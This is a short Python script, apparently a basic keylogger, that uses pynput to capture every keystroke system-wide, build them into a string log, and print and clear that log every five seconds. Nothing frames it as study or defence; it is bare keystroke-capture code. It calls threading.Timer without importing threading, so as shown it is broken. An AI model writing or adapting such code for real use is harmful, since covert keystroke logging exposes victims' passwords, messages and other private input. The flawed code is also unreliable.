import pynput.keyboard
from pynput.keyboard import Key

log = ""


def process_key_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == Key.space:
            log += " "
        else:
            log += " " + str(key) + " "


def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(5, report)
    timer.start()


keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)

with keyboard_listener:
    report()
    keyboard_listener.join()
